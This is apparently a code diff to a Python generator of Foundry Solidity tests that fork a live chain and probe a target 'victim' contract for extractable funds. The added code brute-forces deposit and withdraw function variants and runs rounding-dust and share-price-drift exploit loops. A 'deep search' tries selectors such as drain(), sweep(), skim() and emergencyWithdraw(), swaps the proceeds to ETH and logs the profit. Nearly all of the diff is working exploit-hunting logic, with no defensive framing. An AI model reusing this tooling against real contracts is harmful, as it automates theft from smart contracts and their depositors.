@@ -214,6 +214,18 @@ contract HoneypotTestToken is Test {
         if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
         if (!success) (success, ) = victim.call(abi.encodeWithSignature("leave(uint256)", tokenAmount));
         
+        if (success) {
+             uint256 checkBal = 0;
+             try IERC20(token).balanceOf(attacker) returns (uint256 b) { checkBal = b; } catch {}
+             if (checkBal == 0) {
+                 success = false; // Force Deep Search
+                 console.log("[SIM] Withdraw succeeded but returned 0 tokens. Forcing Deep Search...");
+             }
+        }
+
+
+        <DEEP_SEARCH_LOGIC>
+
         require(success, "Withdraw failed");
 
         // 5. Swap Token -> ETH
@@ -268,6 +280,170 @@ contract HoneypotTestToken is Test {
         console.log("SUCCESS_METHOD:", "FLASH_LOAN_V2_SUCCESS");
         vm.stopPrank();
     }
+
+    function _tryDeposit(uint256 amount) internal returns (bool s) {
+        (s, ) = victim.call(abi.encodeWithSignature("deposit(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("deposit(uint256,address)", amount, attacker));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("deposit()"));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("mint(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("mint()"));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("stake(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("enter(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("supply(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("join(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("contribute(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("buy(uint256)", amount));
+        if (!s) (s, ) = victim.call{value: 1 wei}("");
+    }
+
+    function _tryWithdraw(uint256 amount) internal returns (bool s) {
+        (s, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("withdraw(uint256,address,address)", amount, attacker, attacker));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("redeem(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("withdraw()"));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("leave(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("exit(uint256)", amount));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("exit()"));
+    }
+
+    function testRoundingDustExploit() public {
+        vm.startPrank(attacker);
+        uint256 startEth = 10 ether;
+        vm.deal(attacker, startEth);
+        uint256 ethBalBefore = attacker.balance;
+        
+        // 1. Get Tokens
+        uint256 totalTokens = 0;
+        try this._acquireTokens(startEth) returns (uint256 t) {
+            totalTokens = t;
+        } catch {
+            vm.stopPrank();
+            return;
+        }
+        
+        if (totalTokens == 0) { vm.stopPrank(); return; }
+        
+        IERC20(token).approve(victim, type(uint256).max);
+        
+        // 2. Deposit All
+        bool success = _tryDeposit(totalTokens);
+        
+        if (!success) { vm.stopPrank(); return; }
+        
+        // 3. Loop (5 times)
+        uint256 loopAmt = totalTokens * 9 / 10;
+        for (uint i = 0; i < 5; i++) {
+            // Withdraw 90%
+            success = _tryWithdraw(loopAmt);
+            
+            // Deposit 90%
+            if (success) {
+                _tryDeposit(loopAmt);
+            }
+        }
+        
+        // 4. Final Withdraw All
+        uint256 shares = 0;
+        try IERC20(victim).balanceOf(attacker) returns (uint256 b) { shares = b; } catch {}
+        
+        if (shares > 0) {
+            (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256)", shares));
+            if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
+            if (!success) success = _tryWithdraw(totalTokens);
+        } else {
+             success = _tryWithdraw(totalTokens);
+        }
+
+        if (success) {
+            uint256 checkBal = 0;
+            try IERC20(token).balanceOf(attacker) returns (uint256 b) { checkBal = b; } catch {}
+            if (checkBal == 0) {
+                success = false; // Force Deep Search
+            }
+        }
+
+        <DEEP_SEARCH_LOGIC>
+
+        // 5. Swap back to ETH
+        uint256 tokenBal = IERC20(token).balanceOf(attacker);
+        if (tokenBal > 0 && token != weth) {
+             IERC20(token).approve(router, tokenBal);
+             try IRouter(router).exactInputSingle(IRouter.ExactInputSingleParams({
+                tokenIn: token, tokenOut: weth, fee: 3000, recipient: attacker,
+                deadline: block.timestamp, amountIn: tokenBal, amountOutMinimum: 0, sqrtPriceLimitX96: 0
+            })) returns (uint256 amountOut) {
+                 weth.call(abi.encodeWithSignature("withdraw(uint256)", amountOut));
+            } catch {
+                try IRouter(router).exactInputSingle(IRouter.ExactInputSingleParams({
+                    tokenIn: token, tokenOut: weth, fee: 10000, recipient: attacker,
+                    deadline: block.timestamp, amountIn: tokenBal, amountOutMinimum: 0, sqrtPriceLimitX96: 0
+                })) returns (uint256 amountOut) {
+                     weth.call(abi.encodeWithSignature("withdraw(uint256)", amountOut));
+                } catch {}
+            }
+        } else if (tokenBal > 0 && token == weth) {
+            weth.call(abi.encodeWithSignature("withdraw(uint256)", tokenBal));
+        }
+
+        uint256 ethBalAfter = attacker.balance;
+        int256 profit = int256(ethBalAfter) - int256(ethBalBefore);
+        
+        if (profit > 0) {
+            console.log("PROFIT_WEI:", uint256(profit));
+            console.log("SUCCESS_METHOD: rounding_dust_loop");
+            console.log("[SIM] Rounding Dust Profit:", uint256(profit));
+        }
+        vm.stopPrank();
+    }
+    function testRoundingDrift() public {
+        vm.startPrank(attacker);
+        uint256 startEth = 10 ether;
+        vm.deal(attacker, startEth);
+        
+        // Acquire tokens
+        uint256 totalTokens = 0;
+        try this._acquireTokens(startEth) returns (uint256 t) { totalTokens = t; } catch { vm.stopPrank(); return; }
+        if (totalTokens == 0) { vm.stopPrank(); return; }
+
+        IERC20(token).approve(victim, type(uint256).max);
+
+        // 1. Initial Deposit to set baseline
+        uint256 depositAmt = totalTokens / 2;
+        bool s;
+        (s, ) = victim.call(abi.encodeWithSignature("deposit(uint256)", depositAmt));
+        if (!s) { vm.stopPrank(); return; }
+
+        // Check PPFS (Price Per Full Share)
+        // assets / supply
+        uint256 assets1 = 0;
+        uint256 supply1 = 0;
+        try IVault(victim).totalAssets() returns (uint256 a) { assets1 = a; } catch {}
+        try IVault(victim).totalSupply() returns (uint256 s_val) { supply1 = s_val; } catch {}
+
+        if (supply1 == 0) { vm.stopPrank(); return; }
+
+        // 2. Withdraw 1 wei (Trigger rounding)
+        (s, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", 1));
+        
+        // Check PPFS again
+        uint256 assets2 = 0;
+        uint256 supply2 = 0;
+        try IVault(victim).totalAssets() returns (uint256 a) { assets2 = a; } catch {}
+        try IVault(victim).totalSupply() returns (uint256 s_val) { supply2 = s_val; } catch {}
+
+        if (supply2 > 0 && assets2 > 0) {
+             // Price1 = a1/s1, Price2 = a2/s2
+             // Check if Price2 > Price1
+             // a2 * s1 > a1 * s2
+             if (assets2 * supply1 > assets1 * supply2) {
+                 console.log("SUCCESS_METHOD: rounding_drift");
+                 console.log("PROFIT_WEI: 1");
+                 console.log("[SIM] Rounding Drift Detected: Share Price Increased");
+             }
+        }
+        vm.stopPrank();
+    }
 }
 """
 
@@ -277,6 +453,13 @@ pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
+
+interface IVault {
+    function deposit(uint256) external payable;
+    function withdraw(uint256) external;
+    function totalAssets() external view returns(uint256);
+    function totalSupply() external view returns(uint256);
+}
 
 contract HoneypotTestETH is Test {
     address victim = <VICTIM_ADDRESS>;
@@ -337,30 +520,82 @@ contract HoneypotTestETH is Test {
         
         // Try withdraw(uint256)
         (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", amount));
-        if (success) { _checkProfit(balBefore, "withdraw(uint256)"); vm.stopPrank(); return; }
+        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "withdraw(uint256)"); vm.stopPrank(); return; }
         
         // Try withdraw() - no args
         (success, ) = victim.call(abi.encodeWithSignature("withdraw()"));
-        if (success) { _checkProfit(balBefore, "withdraw()"); vm.stopPrank(); return; }
+        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "withdraw()"); vm.stopPrank(); return; }
 
         // Try withdrawAll()
         (success, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
-        if (success) { _checkProfit(balBefore, "withdrawAll()"); vm.stopPrank(); return; }
+        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "withdrawAll()"); vm.stopPrank(); return; }
 
         // Try redeem(uint256) - ERC4626 standard
         (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256,address,address)", amount, attacker, attacker));
         if (!success) (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256)", amount));
-        if (success) { _checkProfit(balBefore, "redeem(uint256)"); vm.stopPrank(); return; }
+        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "redeem(uint256)"); vm.stopPrank(); return; }
 
         // Try leave() / exit()
         (success, ) = victim.call(abi.encodeWithSignature("leave(uint256)", amount));
-        if (!success) (success, ) = victim.call(abi.encodeWithSignature("exit()"));
-        if (success) { _checkProfit(balBefore, "exit/leave"); vm.stopPrank(); return; }
+        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "leave(uint256)"); vm.stopPrank(); return; }
+        
+        (success, ) = victim.call(abi.encodeWithSignature("exit()"));
+        if (success && attacker.balance > balBefore) { _checkProfit(balBefore, "exit()"); vm.stopPrank(); return; }
+
+        success = false; // Force Deep Search if no profit found
 
         <DEEP_SEARCH_LOGIC>
 
         require(success, "Withdraw failed (tried all variants)");
         
+        vm.stopPrank();
+    }
+
+    function testRoundingDustExploit() public {
+        vm.startPrank(attacker);
+        uint256 startEth = 10 ether;
+        vm.deal(attacker, startEth);
+        uint256 balBefore = attacker.balance;
+        
+        // 1. Deposit All
+        bool success;
+        (success, ) = victim.call{value: startEth}(abi.encodeWithSignature("deposit()"));
+        if (!success) (success, ) = victim.call{value: startEth}("");
+        if (!success) (success, ) = victim.call{value: startEth}(abi.encodeWithSignature("enter()"));
+        
+        if (!success) { vm.stopPrank(); return; }
+        
+        // 2. Loop (5 times)
+        uint256 loopAmt = startEth * 9 / 10;
+        for (uint i = 0; i < 5; i++) {
+             // Withdraw 90%
+             (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", loopAmt));
+             if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdraw()")); 
+             
+             // Deposit 90%
+             if (success) {
+                 (success, ) = victim.call{value: loopAmt}(abi.encodeWithSignature("deposit()"));
+                 if (!success) (success, ) = victim.call{value: loopAmt}("");
+             }
+        }
+        
+        // 3. Final Withdraw All
+        (success, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
+        if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", startEth)); 
+        if (!success) (success, ) = victim.call(abi.encodeWithSignature("withdraw()"));
+        if (!success) (success, ) = victim.call(abi.encodeWithSignature("exit()"));
+        if (!success) (success, ) = victim.call(abi.encodeWithSignature("leave(uint256)", startEth));
+
+        if (success && attacker.balance <= balBefore) {
+             success = false; // Force Deep Search
+        }
+
+        <DEEP_SEARCH_LOGIC>
+
+        uint256 balAfter = attacker.balance;
+        if (balAfter > balBefore) {
+             _checkProfit(balBefore, "rounding_dust_loop");
+        }
         vm.stopPrank();
     }
 
@@ -374,6 +609,56 @@ contract HoneypotTestETH is Test {
         } else {
             console.log("[SIM] No profit or loss detected.");
         }
+    }
+
+    function testRoundingDrift() public {
+        vm.startPrank(attacker);
+        uint256 startEth = 10 ether;
+        vm.deal(attacker, startEth);
+        
+        // 1. Initial Deposit to set baseline
+        uint256 depositAmt = startEth / 2;
+        bool s;
+        (s, ) = victim.call{value: depositAmt}(abi.encodeWithSignature("deposit(uint256)", depositAmt));
+        if (!s) (s, ) = victim.call{value: depositAmt}(abi.encodeWithSignature("deposit()"));
+        if (!s) (s, ) = victim.call{value: depositAmt}("");
+        
+        if (!s) { vm.stopPrank(); return; }
+
+        // Check PPFS (Price Per Full Share)
+        // assets / supply
+        uint256 assets1 = 0;
+        uint256 supply1 = 0;
+        try IVault(victim).totalAssets() returns (uint256 a) { assets1 = a; } catch {
+             assets1 = address(victim).balance;
+        }
+        try IVault(victim).totalSupply() returns (uint256 s_val) { supply1 = s_val; } catch {}
+
+        if (supply1 == 0) { vm.stopPrank(); return; }
+
+        // 2. Withdraw 1 wei (Trigger rounding)
+        (s, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", 1));
+        if (!s) (s, ) = victim.call(abi.encodeWithSignature("withdraw()")); 
+        
+        // Check PPFS again
+        uint256 assets2 = 0;
+        uint256 supply2 = 0;
+        try IVault(victim).totalAssets() returns (uint256 a) { assets2 = a; } catch {
+             assets2 = address(victim).balance;
+        }
+        try IVault(victim).totalSupply() returns (uint256 s_val) { supply2 = s_val; } catch {}
+
+        if (supply2 > 0 && assets2 > 0) {
+             // Price1 = a1/s1, Price2 = a2/s2
+             // Check if Price2 > Price1
+             // a2 * s1 > a1 * s2
+             if (assets2 * supply1 > assets1 * supply2) {
+                 console.log("SUCCESS_METHOD: rounding_drift");
+                 console.log("PROFIT_WEI: 1");
+                 console.log("[SIM] Rounding Drift Detected: Share Price Increased");
+             }
+        }
+        vm.stopPrank();
     }
 }
 """
@@ -599,6 +884,9 @@ def generate_honeypot_test_token(victim_address: str, token_address: str, rpc_ur
     tw_logic = _get_timestamp_warp_logic(bug_type)
     content = content.replace("<TIMESTAMP_WARP_LOGIC>", tw_logic)
     
+    ds_logic = _get_deep_search_logic_token()
+    content = content.replace("<DEEP_SEARCH_LOGIC>", ds_logic)
+    
     return content
 
 def generate_honeypot_test_eth(victim_address: str, rpc_url: str, self_destruct_selectors: List[str] = None, bug_type: Optional[str] = None) -> str:
@@ -617,6 +905,71 @@ def generate_honeypot_test_eth(victim_address: str, rpc_url: str, self_destruct_
     content = content.replace("<DEEP_SEARCH_LOGIC>", ds_logic)
     
     return content
+
+def _get_deep_search_logic_token() -> str:
+    return """
+        // Deep Search / Last Resort (Token Mode)
+        if (!success) {
+             bytes4[16] memory selectors = [
+                bytes4(keccak256("getReward()")),
+                bytes4(keccak256("claim()")),
+                bytes4(keccak256("claimReward()")),
+                bytes4(keccak256("distribute()")),
+                bytes4(keccak256("harvest()")),
+                bytes4(keccak256("skim(address)")),
+                bytes4(keccak256("recover()")),
+                bytes4(keccak256("refund()")),
+                bytes4(keccak256("emergencyWithdraw()")),
+                bytes4(keccak256("withdrawAll()")),
+                bytes4(keccak256("withdraw()")),
+                bytes4(keccak256("exit()")),
+                bytes4(keccak256("collect()")),
+                bytes4(keccak256("redeem()")),
+                bytes4(keccak256("sweep()")),
+                bytes4(keccak256("drain()"))
+             ];
+
+             for (uint i = 0; i < selectors.length; i++) {
+                 uint256 deepBalCheck = attacker.balance;
+                 uint256 deepTokenCheck = 0;
+                 try IERC20(token).balanceOf(attacker) returns (uint256 b) { deepTokenCheck = b; } catch {}
+                 
+                 bool s;
+                 (s, ) = victim.call(abi.encodeWithSelector(selectors[i]));
+                 if (!s) (s, ) = victim.call{value: 1 wei}(abi.encodeWithSelector(selectors[i]));
+                 if (!s && selectors[i] == bytes4(keccak256("skim(address)"))) (s, ) = victim.call(abi.encodeWithSelector(selectors[i], attacker));
+
+                 if (s) {
+                     // Check ETH profit
+                     if (attacker.balance > deepBalCheck) {
+                         // _checkProfit is internal to Test contract, we can reuse it if available or inline log
+                         console.log("SUCCESS_METHOD: deep_search"); 
+                         console.log("PROFIT_WEI:", attacker.balance - deepBalCheck);
+                         console.log("[SIM] Profit found (ETH):", attacker.balance - deepBalCheck);
+                         console.log("SELECTOR:");
+                         console.logBytes4(selectors[i]);
+                         success = true; 
+                         vm.stopPrank();
+                         return;
+                     }
+                     
+                     // Check Token profit
+                     uint256 deepTokenAfter = 0;
+                     try IERC20(token).balanceOf(attacker) returns (uint256 b) { deepTokenAfter = b; } catch {}
+                     
+                     if (deepTokenAfter > deepTokenCheck) {
+                         console.log("SUCCESS_METHOD: deep_search");
+                         console.log("SELECTOR:");
+                         console.logBytes4(selectors[i]);
+                         console.log("[SIM] Profit found (Token):", deepTokenAfter - deepTokenCheck);
+                         success = true;
+                         // Do NOT return; fall through to Swap logic
+                         break;
+                     }
+                 }
+             }
+        }
+    """
 
 def _get_deep_search_logic() -> str:
     return """
